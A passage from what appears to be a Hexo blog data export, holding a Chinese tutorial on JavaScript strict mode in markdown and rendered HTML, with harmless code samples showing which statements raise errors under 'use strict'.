报错 (x is not defined)\n```\n\n- 禁止 `this` 关键字指向全局对象:\n```js\nfunction f(){\n  return !this;\n} \n// 返回false，因为\"this\"指向全局对象，\"!this\"就是false\n\nfunction f(){ \n  \"use strict\";\n  return !this;\n} \n// 返回true，因为严格模式下，this的值为undefined，所以\"!this\"为true。\n\n//因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错:\nfunction f(){\n  \"use strict\";\n  this.a = 1;\n};\nf();    // 报错，this未定义\n```\n\n- `use strict` 指令只运行出现在脚本或函数的开头。\n\n#### <a name=\"key\">4、保留关键字</a>\n\n- **为了向将来Javascript的新版本过渡，严格模式新增了一些 `保留关键字`：**\n  - implements\n  - interface\n  - let\n  - package\n  - private\n  - protected\n  - public\n  - static\n  - yield\n\n#### <a name=\"#regulation\">5、严格模式下的规则</a>\n\n- 变量不能未声明就使用\n- 函数参数必须有唯一的名称 （否则会被认为是语法错误）\n- `with` 语句被禁止使用\n- 赋值给只读属性会抛出一个错误\n- 像 `00840` 这样的八进制数是语法错误\n- 尝试 `delete` 不可删除的数据会抛出一个错误\n- `delete prop` 被认为是语法错误, 只能删除属性 `delete global[prop]`\n- `eval` 不会引入新的变量到它的作用域\n- `eval` 和 `arguments` 的绑定不会被改变\n- `arguments` 不会神奇地跟踪方法参数的变化\n- 不再支持 `arguments.callee`，使用它会抛出 `TypeError`\n- 不再支持 `arguments.caller`，使用它会抛出 `TypeError`\n- 上下文作为 `this` 在方法调用时不会被强制包装成一个 `Object`（即 `this` 不会指向全局对象）\n- 不再能够使用 `fn.caller` 和 `fn.arguments` 访问 `JavaScript` 的堆栈\n- 保留字(例如 `protected`, `static`, `interface`等等)不能被作为新变量声明 <a href=\"#key\">保留关键字</a>","source":"_posts/0809023_认识JavaScript严格模式.md","raw":"---\nid: 0809023\ntitle: 认识 JavaScript 严格模式\ndate: 2016-12-19 16:17:23\ntags:\n  - JavaScript\ncategories:\n---\n\n<a href=\"#whatIs\">1. 关于严格模式</a>\n<a href=\"#why\">2. 为什么使用严格模式</a>\n<a href=\"#ctrl\">3. 严格模式的限制</a>\n<a href=\"#key\">4. 保留关键字</a>\n<a href=\"regulation\">5. 严格模式下的规则</a>\n\n#### <a name=\"whatIs\">1、关于严格模式</a>\n\n- JavaScript 严格模式（strict mode）即在 `严格的条件`下运行。\n\n- 严格模式通过在脚本或函数的头部添加 `use strict`; 表达式来声明。\n\n- `use strict` 指令不是一条语句，但是是一个字面量表达式，在 `JavaScript` 旧版本中会被忽略。\n\n- `use strict` 的目的是指定代码在严格条件下执行。\n\n- `严格模式下你不能使用未声明的变量。`\n\n  **支持严格模式的浏览器:**\n  IE 10+、 Firefox 4+、 Chrome 13+、 Safari 5.1+、 Opera 12+。\n\n#### <a name=\"why\">2、为什么使用严格模式</a>\n\n- 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;\n  - 消除代码运行的一些不安全之处，保证代码运行的安全；\n  - 提高编译器效率，增加运行速度；\n  - 为未来新版本的Javascript做好铺垫。\n\n- \"严格模式\"体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。\n\n- 另一方面，同样的代码，在\"严格模式\"中，可能会有不一样的运行结果；一些在\"正常模式\"下可以运行的语句，在\"严格模式\"下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。\n\n#### <a name=\"ctrl\">3、严格模式的限制</a>\n\n- 不允许使用未声明的变量\n```js\n\"use strict\";\nx = 3.14;           // Uncaught ReferenceError: x is not defined\n\ny = {p1:10, p2:20}; // Uncaught ReferenceError: y is not defined\n```\n\n- 不允许删除变量或对象。\n```js\n\"use strict\";\nvar x = 3.14;\ndelete x;           // Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.\n```\n\n- 不允许变量重名:\n```js\n\"use strict\";\nfunction func(p1, p1) {};   // 报错\n```\n\n- 不允许使用八进制:\n```js\n\"use strict\";\nvar x = 010;                // 报错\n```\n\n- 不允许使用转义字符:\n```js\n\"use strict\";\nvar x = \\010;               // 报错\n```\n\n- 不允许对只读属性赋值:\n```js\n\"use strict\";\nvar obj = {};\nObject.defineProperty(obj, \"x\", {value:0, writable:false});\n\nobj.x = 3.14;               // 报错\n```\n\n- 不允许对一个使用 `getter` 方法读取的属性进行赋值\n```js\n\"use strict\";\nvar obj = {get x() {return 0} };\n\nobj.x = 3.14;               // 报错\n```\n\n- 不允许删除一个不可删除的属性：\n```js\n\"use strict\";\ndelete Object.prototype;    // 报错\n```\n\n- 变量名不能使用 `eval` 字符串:\n```js\n\"use strict\";\nvar eval = 3.14;            // 报错\n```\n\n- 变量名不能使用 `arguments` 字符串:\n```js\n\"use strict\";\nvar arguments = 3.14;       // 报错\n```\n\n- 不允许使用以下这种语句:\n```js\n\"use strict\";\nwith (Math){x = cos(2)};    // 报错\n```\n\n- 由于一些安全原因，在作用域 `eval()` 中创建的变量不能被调用:\n```js\n\"use strict\";\neval (\"var x = 2\");\nalert (x);                  // 报错 (x is not defined)\n```\n\n- 禁止 `this` 关键字指向全局对象:\n```js\nfunction f(){\n  return !this;\n} \n// 返回false，因为\"this\"指向全局对象，\"!this\"就是false\n\nfunction f(){ \n  \"use strict\";\n  return !this;\n} \n// 返回true，因为严格模式下，this的值为undefined，所以\"!this\"为true。\n\n//因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错:\nfunction f(){\n  \"use strict\";\n  this.a = 1;\n};\nf();    // 报错，this未定义\n```\n\n- `use strict` 指令只运行出现在脚本或函数的开头。\n\n#### <a name=\"key\">4、保留关键字</a>\n\n- **为了向将来Javascript的新版本过渡，严格模式新增了一些 `保留关键字`：**\n  - implements\n  - interface\n  - let\n  - package\n  - private\n  - protected\n  - public\n  - static\n  - yield\n\n#### <a name=\"#regulation\">5、严格模式下的规则</a>\n\n- 变量不能未声明就使用\n- 函数参数必须有唯一的名称 （否则会被认为是语法错误）\n- `with` 语句被禁止使用\n- 赋值给只读属性会抛出一个错误\n- 像 `00840` 这样的八进制数是语法错误\n- 尝试 `delete` 不可删除的数据会抛出一个错误\n- `delete prop` 被认为是语法错误, 只能删除属性 `delete global[prop]`\n- `eval` 不会引入新的变量到它的作用域\n- `eval` 和 `arguments` 的绑定不会被改变\n- `arguments` 不会神奇地跟踪方法参数的变化\n- 不再支持 `arguments.callee`，使用它会抛出 `TypeError`\n- 不再支持 `arguments.caller`，使用它会抛出 `TypeError`\n- 上下文作为 `this` 在方法调用时不会被强制包装成一个 `Object`（即 `this` 不会指向全局对象）\n- 不再能够使用 `fn.caller` 和 `fn.arguments` 访问 `JavaScript` 的堆栈\n- 保留字(例如 `protected`, `static`, `interface`等等)不能被作为新变量声明 <a href=\"#key\">保留关键字</a>","slug":"0809023_认识JavaScript严格模式","published":1,"updated":"2018-03-26T12:25:15.316Z","_id":"cjfhshvuc0010s4c0fqj1i77l","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"#whatIs\">1. 关于严格模式</a><br><a href=\"#why\">2. 为什么使用严格模式</a><br><a href=\"#ctrl\">3. 严格模式的限制</a><br><a href=\"#key\">4. 保留关键字</a><br><a href=\"regulation\">5. 严格模式下的规则</a></p>\n<h4 id=\"1、关于严格模式\"><a href=\"#1、关于严格模式\" class=\"headerlink\" title=\"1、关于严格模式\"></a><a name=\"whatIs\">1、关于严格模式</a></h4><ul>\n<li><p>JavaScript 严格模式（strict mode）即在 <code>严格的条件</code>下运行。</p>\n</li>\n<li><p>严格模式通过在脚本或函数的头部添加 <code>use strict</code>; 表达式来声明。</p>\n</li>\n<li><p><code>use strict</code> 指令不是一条语句，但是是一个字面量表达式，在 <code>JavaScript</code> 旧版本中会被忽略。</p>\n</li>\n<li><p><code>use strict</code> 的目的是指定代码在严格条件下执行。</p>\n</li>\n<li><p><code>严格模式下你不能使用未声明的变量。</code></p>\n<p><strong>支持严格模式的浏览器:</strong><br>IE 10+、 Firefox 4+、 Chrome 13+、 Safari 5.1+、 Opera 12+。</p>\n</li>\n</ul>\n<h4 id=\"2、为什么使用严格模式\"><a href=\"#2、为什么使用严格模式\" class=\"headerlink\" title=\"2、为什么使用严格模式\"></a><a name=\"why\">2、为什么使用严格模式</a></h4><ul>\n<li><p>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</p>\n<ul>\n<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>\n<li>提高编译器效率，增加运行速度；</li>\n<li>为未来新版本的Javascript做好铺垫。</li>\n</ul>\n</li>\n<li><p>“严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。</p>\n</li>\n<li><p>另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果；一些在”正常模式”下可以运行的语句，在”严格模式”下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。</p>\n</li>\n</ul>\n<h4 id=\"3、严格模式的限制\"><a href=\"#3、严格模式的限制\" class=\"headerlink\" title=\"3、严格模式的限制\"></a><a name=\"ctrl\">3、严格模式的限制</a></h4><ul>\n<li><p>不允许使用未声明的变量</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\">x = <span class=\"number\">3.14</span>;           <span class=\"comment\">// Uncaught ReferenceError: x is not defined</span></span><br><span class=\"line\"></span><br><span class=\"line\">y = &#123;<span class=\"attr\">p1</span>:<span class=\"number\">10</span>, <span class=\"attr\">p2</span>:<span class=\"number\">20</span>&#125;; <span class=\"comment\">// Uncaught ReferenceError: y is not defined</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许删除变量或对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">3.14</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> x;           <span class=\"comment\">// Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许变量重名:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\">p1, p1</span>) </span>&#123;&#125;;   <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许使用八进制:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">010</span>;                <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许使用转义字符:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = \\<span class=\"number\">010</span>;               <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许对只读属性赋值:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj, <span class=\"string\">\"x\"</span>, &#123;<span class=\"attr\">value</span>:<span class=\"number\">0</span>, <span class=\"attr\">writable</span>:<span class=\"literal\">false</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">obj.x = <span class=\"number\">3.14</span>;               <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许对一个使用 <code>getter</code> 方法读取的属性进行赋值</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;get x() &#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>&#125; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">obj.x = <span class=\"number\">3.14</span>;               <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许删除一个不可删除的属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"built_in\">Object</span>.prototype;    <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>变量名不能使用 <code>eval</code> 字符串:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">eval</span> = <span class=\"number\">3.14</span>;            <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>变量名不能使用 <code>arguments</code> 字符串:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">arguments</span> = <span class=\"number\">3.14</span>;       <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许使用以下这种语句:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">with</span> (<span class=\"built_in\">Math</span>)&#123;x = cos(<span class=\"number\">2</span>)&#125;;    <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>由于一些安全原因，在作用域 <code>eval()</code> 中创建的变量不能被调用:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span> (<span class=\"string\">\"var x = 2\"</span>);</span><br><span class=\"line\">alert (x);                  <span class=\"comment\">// 报错 (x is not defined)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>禁止 <code>this</code> 关键字指向全局对象:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"comment\">// 返回false，因为\"this\"指向全局对象，\"!this\"就是false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\"><span class=\"meta\">  \"use strict\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"comment\">// 返回true，因为严格模式下，this的值为undefined，所以\"!this\"为true。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"meta\">  \"use strict\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.a = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">f();    <span class=\"comment\">// 报错，this未定义</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>use strict</code> 指令只运行出现在脚本或函数的开头。</p>\n</li>\n</ul>\n<h4 id=\"4、保留关键字\"><a href=\"#4、保留关键字\" class=\"headerlink\" title=\"4、保留关键字\"></a><a name=\"key\">4、保留关键字</a></h4><ul>\n<li><strong>为了向将来Javascript的新版本过渡，严格模式新增了一些 <code>保留关键字</code>：</strong><ul>\n<li>implements</li>\n<li>interface</li>\n<li>let</li>\n<li>package</li>\n<li>private</li>\n<li>protected</li>\n<li>public</li>\n<li>static</li>\n<li>yield</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"5、严格模式下的规则\"><a href=\"#5、严格模式下的规则\" class=\"headerlink\" title=\"5、严格模式下的规则\"></a><a name=\"#regulation\">5、严格模式下的规则</a></h4><ul>\n<li>变量不能未声明就使用</li>\n<li>函数参数必须有唯一的名称 （否则会被认为是语法错误）</li>\n<li><code>with</code> 语句被禁止使用</li>\n<li>赋值给只读属性会抛出一个错误</li>\n<li>像 <code>00840</code> 这样的八进制数是语法错误</li>\n<li>尝试 <code>delete</code> 不可删除的数据会抛出一个错误</li>\n<li><code>delete prop</code> 被认为是语法错误, 只能删除属性 <code>delete global[prop]</code></li>\n<li><code>eval</code> 不会引入新的变量到它的作用域</li>\n<li><code>eval</code> 和 <code>arguments</code> 的绑定不会被改变</li>\n<li><code>arguments</code> 不会神奇地跟踪方法参数的变化</li>\n<li>不再支持 <code>arguments.callee</code>，使用它会抛出 <code>TypeError</code></li>\n<li>不再支持 <code>arguments.caller</code>，使用它会抛出 <code>TypeError</code></li>\n<li>上下文作为 <code>this</code> 在方法调用时不会被强制包装成一个 <code>Object</code>（即 <code>this</code> 不会指向全局对象）</li>\n<li>不再能够使用 <code>fn.caller</code> 和 <code>fn.arguments</code> 访问 <code>JavaScript</code> 的堆栈</li>\n<li>保留字(例如 <code>protected</code>, <code>static</code>, <code>interface</code>等等)不能被作为新变量声明 <a href=\"#key\">保留关键字</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"#whatIs\">1. 关于严格模式</a><br><a href=\"#why\">2. 为什么使用严格模式</a><br><a href=\"#ctrl\">3. 严格模式的限制</a><br><a href=\"#key\">4. 保留关键字</a><br><a href=\"regulation\">5. 严格模式下的规则</a></p>\n<h4 id=\"1、关于严格模式\"><a href=\"#1、关于严格模式\" class=\"headerlink\" title=\"1、关于严格模式\"></a><a name=\"whatIs\">1、关于严格模式</a></h4><ul>\n<li><p>JavaScript 严格模式（strict mode）即在 <code>严格的条件</code>下运行。</p>\n</li>\n<li><p>严格模式通过在脚本或函数的头部添加 <code>use strict</code>; 表达式来声明。</p>\n</li>\n<li><p><code>use strict</code> 指令不是一条语句，但是是一个字面量表达式，在 <code>JavaScript</code> 旧版本中会被忽略。</p>\n</li>\n<li><p><code>use strict</code> 的目的是指定代码在严格条件下执行。</p>\n</li>\n<li><p><code>严格模式下你不能使用未声明的变量。</code></p>\n<p><strong>支持严格模式的浏览器:</strong><br>IE 10+、 Firefox 4+、 Chrome 13+、 Safari 5.1+、 Opera 12+。</p>\n</li>\n</ul>\n<h4 id=\"2、为什么使用严格模式\"><a href=\"#2、为什么使用严格模式\" class=\"headerlink\" title=\"2、为什么使用严格模式\"></a><a name=\"why\">2、为什么使用严格模式</a></h4><ul>\n<li><p>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</p>\n<ul>\n<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>\n<li>提高编译器效率，增加运行速度；</li>\n<li>为未来新版本的Javascript做好铺垫。</li>\n</ul>\n</li>\n<li><p>“严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。</p>\n</li>\n<li><p>另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果；一些在”正常模式”下可以运行的语句，在”严格模式”下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。</p>\n</li>\n</ul>\n<h4 id=\"3、严格模式的限制\"><a href=\"#3、严格模式的限制\" class=\"headerlink\" title=\"3、严格模式的限制\"></a><a name=\"ctrl\">3、严格模式的限制</a></h4><ul>\n<li><p>不允许使用未声明的变量</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\">x = <span class=\"number\">3.14</span>;           <span class=\"comment\">// Uncaught ReferenceError: x is not defined</span></span><br><span class=\"line\"></span><br><span class=\"line\">y = &#123;<span class=\"attr\">p1</span>:<span class=\"number\">10</span>, <span class=\"attr\">p2</span>:<span class=\"number\">20</span>&#125;; <span class=\"comment\">// Uncaught ReferenceError: y is not defined</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许删除变量或对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">3.14</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> x;           <span class=\"comment\">// Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许变量重名:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\">p1, p1</span>) </span>&#123;&#125;;   <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许使用八进制:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">010</span>;                <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许使用转义字符:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = \\<span class=\"number\">010</span>;               <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许对只读属性赋值:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj, <span class=\"string\">\"x\"</span>, &#123;<span class=\"attr\">value</span>:<span class=\"number\">0</span>, <span class=\"attr\">writable</span>:<span class=\"literal\">false</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">obj.x = <span class=\"number\">3.14</span>;               <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许对一个使用 <code>getter</code> 方法读取的属性进行赋值</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;get x() &#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>&#125; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">obj.x = <span class=\"number\">3.14</span>;               <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许删除一个不可删除的属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"built_in\">Object</span>.prototype;    <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>变量名不能使用 <code>eval</code> 字符串:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">eval</span> = <span class=\"number\">3.14</span>;            <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>变量名不能使用 <code>arguments</code> 字符串:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">arguments</span> = <span class=\"number\">3.14</span>;       <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不允许使用以下这种语句:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">with</span> (<span class=\"built_in\">Math</span>)&#123;x = cos(<span class=\"number\">2</span>)&#125;;    <span class=\"comment\">// 报错</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>由于一些安全原因，在作用域 <code>eval()</code> 中创建的变量不能被调用:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span> (<span class=\"string\">\"var x = 2\"</span>);</span><br><span class=\"line\">alert (x);                  <span class=\"comment\">// 报错 (x is not defined)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>禁止 <code>this</code> 关键字指向全局对象:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"comment\">// 返回false，因为\"this\"指向全局对象，\"!this\"就是false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span 